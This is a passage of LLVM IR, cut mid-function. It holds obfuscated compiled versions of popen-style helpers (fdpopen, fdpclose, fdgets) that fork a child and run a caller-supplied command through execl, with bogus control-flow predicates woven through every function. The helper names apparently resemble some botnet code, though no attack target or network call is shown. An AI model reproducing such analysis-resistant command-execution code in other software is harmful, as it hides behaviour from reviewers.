  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %2
  %15 = load i32, i32* @x.19
  %16 = load i32, i32* @y.20
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i8*, i8** %5, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 119
  %27 = load i32, i32* @x.19
  %28 = load i32, i32* @y.20
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %41, label %35

; <label>:35:                                     ; preds = %originalBBpart2, %2
  %36 = load i8*, i8** %5, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %35, %originalBBpart2
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:42:                                     ; preds = %35
  %43 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %44 = call i32 @pipe(i32* %43) #2
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %42
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:47:                                     ; preds = %42
  %48 = load i32, i32* @x.19
  %49 = load i32, i32* @y.20
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = icmp eq i32* %56, null
  %58 = load i32, i32* @x.19
  %59 = load i32, i32* @y.20
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %57, label %66, label %102

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = call i32 @getdtablesize() #2
  store i32 %67, i32* %8, align 4
  %68 = icmp sle i32 %67, 0
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %66
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = mul i64 %72, 4
  %74 = trunc i64 %73 to i32
  %75 = zext i32 %74 to i64
  %76 = call noalias i8* @malloc(i64 %75) #2
  %77 = bitcast i8* %76 to i32*
  store i32* %77, i32** @fdopen_pids, align 8
  %78 = icmp eq i32* %77, null
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %70
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:80:                                     ; preds = %70
  %81 = load i32, i32* @x.19
  %82 = load i32, i32* @y.20
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %80
  %89 = load i32*, i32** @fdopen_pids, align 8
  %90 = bitcast i32* %89 to i8*
  %91 = load i32, i32* %8, align 4
  %92 = sext i32 %91 to i64
  %93 = mul i64 %92, 4
  call void @llvm.memset.p0i8.i64(i8* %90, i8 0, i64 %93, i32 1, i1 false)
  %94 = load i32, i32* @x.19
  %95 = load i32, i32* @y.20
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart212, label %originalBB6alteredBB

originalBBpart212:                                ; preds = %originalBB6
  br label %102

; <label>:102:                                    ; preds = %originalBBpart212, %originalBBpart24
  %103 = call i32 @vfork() #11
  store i32 %103, i32* %9, align 4
  switch i32 %103, label %213 [
    i32 -1, label %104
    i32 0, label %111
  ]

; <label>:104:                                    ; preds = %102
  %105 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %106 = load i32, i32* %105, align 4
  %107 = call i32 @close(i32 %106)
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:111:                                    ; preds = %102
  %112 = load i32, i32* @x.19
  %113 = load i32, i32* @y.20
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %111
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 114
  %124 = load i32, i32* @x.19
  %125 = load i32, i32* @y.20
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %123, label %132, label %163

; <label>:132:                                    ; preds = %originalBBpart216
  %133 = load i32, i32* @x.19
  %134 = load i32, i32* @y.20
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %132
  %141 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %142 = load i32, i32* %141, align 4
  %143 = icmp ne i32 %142, 1
  %144 = load i32, i32* @x.19
  %145 = load i32, i32* @y.20
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %143, label %152, label %159

; <label>:152:                                    ; preds = %originalBBpart220
  %153 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @dup2(i32 %154, i32 1) #2
  %156 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %157 = load i32, i32* %156, align 4
  %158 = call i32 @close(i32 %157)
  br label %159

; <label>:159:                                    ; preds = %152, %originalBBpart220
  %160 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %161 = load i32, i32* %160, align 4
  %162 = call i32 @close(i32 %161)
  br label %194

; <label>:163:                                    ; preds = %originalBBpart216
  %164 = load i32, i32* @x.19
  %165 = load i32, i32* @y.20
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %163
  %172 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %173 = load i32, i32* %172, align 4
  %174 = icmp ne i32 %173, 0
  %175 = load i32, i32* @x.19
  %176 = load i32, i32* @y.20
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %174, label %183, label %190

; <label>:183:                                    ; preds = %originalBBpart224
  %184 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %185 = load i32, i32* %184, align 4
  %186 = call i32 @dup2(i32 %185, i32 0) #2
  %187 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @close(i32 %188)
  br label %190

; <label>:190:                                    ; preds = %183, %originalBBpart224
  %191 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %192 = load i32, i32* %191, align 4
  %193 = call i32 @close(i32 %192)
  br label %194

; <label>:194:                                    ; preds = %190, %159
  %195 = load i32, i32* @x.19
  %196 = load i32, i32* @y.20
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %194
  %203 = load i8*, i8** %4, align 8
  %204 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0), i8* %203, i8* null) #2
  call void @_exit(i32 127) #12
  %205 = load i32, i32* @x.19
  %206 = load i32, i32* @y.20
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  unreachable

; <label>:213:                                    ; preds = %102
  %214 = load i8*, i8** %5, align 8
  %215 = load i8, i8* %214, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 114
  br i1 %217, label %218, label %224

; <label>:218:                                    ; preds = %213
  %219 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %220 = load i32, i32* %219, align 4
  store i32 %220, i32* %6, align 4
  %221 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %222 = load i32, i32* %221, align 4
  %223 = call i32 @close(i32 %222)
  br label %230

; <label>:224:                                    ; preds = %213
  %225 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %226 = load i32, i32* %225, align 4
  store i32 %226, i32* %6, align 4
  %227 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %228 = load i32, i32* %227, align 4
  %229 = call i32 @close(i32 %228)
  br label %230

; <label>:230:                                    ; preds = %224, %218
  %231 = load i32, i32* @x.19
  %232 = load i32, i32* @y.20
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %230
  %239 = load i32, i32* %9, align 4
  %240 = load i32*, i32** @fdopen_pids, align 8
  %241 = load i32, i32* %6, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds i32, i32* %240, i64 %242
  store i32 %239, i32* %243, align 4
  %244 = load i32, i32* %6, align 4
  store i32 %244, i32* %3, align 4
  %245 = load i32, i32* @x.19
  %246 = load i32, i32* @y.20
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %253

; <label>:253:                                    ; preds = %originalBBpart232, %104, %79, %69, %46, %41
  %254 = load i32, i32* %3, align 4
  ret i32 %254

originalBBalteredBB:                              ; preds = %originalBB, %14
  %255 = load i8*, i8** %5, align 8
  %256 = load i8, i8* %255, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp ne i32 %257, 119
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %259 = load i32*, i32** @fdopen_pids, align 8
  %260 = icmp eq i32* %259, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %80
  %261 = load i32*, i32** @fdopen_pids, align 8
  %262 = bitcast i32* %261 to i8*
  %263 = load i32, i32* %8, align 4
  %264 = sext i32 %263 to i64
  %_ = sub i64 %264, 4
  %gen = mul i64 %_, 4
  %_7 = sub i64 0, %264
  %gen8 = add i64 %_7, 4
  %_9 = sub i64 %264, 4
  %gen10 = mul i64 %_9, 4
  %265 = mul i64 %264, 4
  call void @llvm.memset.p0i8.i64(i8* %262, i8 0, i64 %265, i32 1, i1 false)
  br label %originalBB6

originalBB14alteredBB:                            ; preds = %originalBB14, %111
  %266 = load i8*, i8** %5, align 8
  %267 = load i8, i8* %266, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 114
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %132
  %270 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %271 = load i32, i32* %270, align 4
  %272 = icmp ne i32 %271, 1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %163
  %273 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %274 = load i32, i32* %273, align 4
  %275 = icmp ne i32 %274, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %194
  %276 = load i8*, i8** %4, align 8
  %277 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0), i8* %276, i8* null) #2
  call void @_exit(i32 127) #12
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %230
  %278 = load i32, i32* %9, align 4
  %279 = load i32*, i32** @fdopen_pids, align 8
  %280 = load i32, i32* %6, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds i32, i32* %279, i64 %281
  store i32 %278, i32* %282, align 4
  %283 = load i32, i32* %6, align 4
  store i32 %283, i32* %3, align 4
  br label %originalBB30
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %36

; <label>:19:                                     ; preds = %12, %1
  %20 = load i32, i32* @x.21
  %21 = load i32, i32* @y.22
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  store i32 -1, i32* %2, align 4
  %28 = load i32, i32* @x.21
  %29 = load i32, i32* @y.22
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %126

; <label>:36:                                     ; preds = %12
  %37 = load i32, i32* %3, align 4
  %38 = call i32 @close(i32 %37)
  %39 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %40 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %41 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %42 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %43 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %44

; <label>:44:                                     ; preds = %74, %36
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %3, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  %49 = load i32, i32* %48, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %7, i32 0)
  store i32 %50, i32* %8, align 4
  br label %51

; <label>:51:                                     ; preds = %44
  %52 = load i32, i32* %8, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %74

; <label>:54:                                     ; preds = %51
  %55 = load i32, i32* @x.21
  %56 = load i32, i32* @y.22
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = call i32* @__errno_location() #13
  %64 = load i32, i32* %63, align 4
  %65 = icmp eq i32 %64, 4
  %66 = load i32, i32* @x.21
  %67 = load i32, i32* @y.22
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %74

; <label>:74:                                     ; preds = %originalBBpart24, %51
  %75 = phi i1 [ false, %51 ], [ %65, %originalBBpart24 ]
  br i1 %75, label %44, label %76

; <label>:76:                                     ; preds = %74
  %77 = load i32, i32* @x.21
  %78 = load i32, i32* @y.22
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %86 = load i32*, i32** @fdopen_pids, align 8
  %87 = load i32, i32* %4, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i32, i32* %86, i64 %88
  store i32 0, i32* %89, align 4
  %90 = load i32, i32* %8, align 4
  %91 = icmp eq i32 %90, -1
  %92 = load i32, i32* @x.21
  %93 = load i32, i32* @y.22
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %91, label %100, label %101

; <label>:100:                                    ; preds = %originalBBpart28
  br label %108

; <label>:101:                                    ; preds = %originalBBpart28
  %102 = bitcast %struct.in_addr* %9 to i32*
  %103 = load i32, i32* %7, align 4
  store i32 %103, i32* %102, align 4
  %104 = bitcast %struct.in_addr* %9 to i32*
  %105 = load i32, i32* %104, align 4
  %106 = and i32 %105, 65280
  %107 = ashr i32 %106, 8
  br label %108

; <label>:108:                                    ; preds = %101, %100
  %109 = phi i32 [ -1, %100 ], [ %107, %101 ]
  %110 = load i32, i32* @x.21
  %111 = load i32, i32* @y.22
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %108
  store i32 %109, i32* %2, align 4
  %118 = load i32, i32* @x.21
  %119 = load i32, i32* @y.22
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %126

; <label>:126:                                    ; preds = %originalBBpart212, %originalBBpart2
  %127 = load i32, i32* %2, align 4
  ret i32 %127

originalBBalteredBB:                              ; preds = %originalBB, %19
  store i32 -1, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  %128 = call i32* @__errno_location() #13
  %129 = load i32, i32* %128, align 4
  %130 = icmp eq i32 %129, 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  %131 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %132 = load i32*, i32** @fdopen_pids, align 8
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %132, i64 %134
  store i32 0, i32* %135, align 4
  %136 = load i32, i32* %8, align 4
  %137 = icmp eq i32 %136, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %108
  store i32 %109, i32* %2, align 4
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %originalBBpart220, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %41

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %41

; <label>:16:                                     ; preds = %12
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i8*, i8** %4, align 8
  %26 = load i32, i32* %8, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = getelementptr inbounds i8, i8* %28, i64 -1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 10
  %33 = load i32, i32* @x.23
  %34 = load i32, i32* @y.24
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %41

; <label>:41:                                     ; preds = %originalBBpart2, %12, %9
  %42 = phi i1 [ false, %12 ], [ false, %9 ], [ %32, %originalBBpart2 ]
  %43 = load i32, i32* @x.23
  %44 = load i32, i32* @y.24
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  %51 = load i32, i32* @x.23
  %52 = load i32, i32* @y.24
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %42, label %59, label %85

; <label>:59:                                     ; preds = %originalBBpart24
  %60 = load i32, i32* @x.23
  %61 = load i32, i32* @y.24
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %59
  %68 = load i32, i32* %6, align 4
  %69 = load i8*, i8** %4, align 8
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %69, i64 %71
  %73 = call i64 @read(i32 %68, i8* %72, i64 1)
  %74 = trunc i64 %73 to i32
  store i32 %74, i32* %7, align 4
  %75 = load i32, i32* %8, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %8, align 4
  %77 = load i32, i32* @x.23
  %78 = load i32, i32* @y.24
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart220, label %originalBB6alteredBB

originalBBpart220:                                ; preds = %originalBB6
  br label %9

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = load i32, i32* %7, align 4
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %85
  br label %91

; <label>:89:                                     ; preds = %85
  %90 = load i8*, i8** %4, align 8
  br label %91

; <label>:91:                                     ; preds = %89, %88
  %92 = phi i8* [ null, %88 ], [ %90, %89 ]
  %93 = load i32, i32* @x.23
  %94 = load i32, i32* @y.24
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %91
  %101 = load i32, i32* @x.23
  %102 = load i32, i32* @y.24
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  ret i8* %92

originalBBalteredBB:                              ; preds = %originalBB, %16
  %109 = load i8*, i8** %4, align 8
  %110 = load i32, i32* %8, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8, i8* %109, i64 %111
  %113 = getelementptr inbounds i8, i8* %112, i64 -1
  %114 = load i8, i8* %113, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp ne i32 %115, 10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %59
  %117 = load i32, i32* %6, align 4
  %118 = load i8*, i8** %4, align 8
  %119 = load i32, i32* %8, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
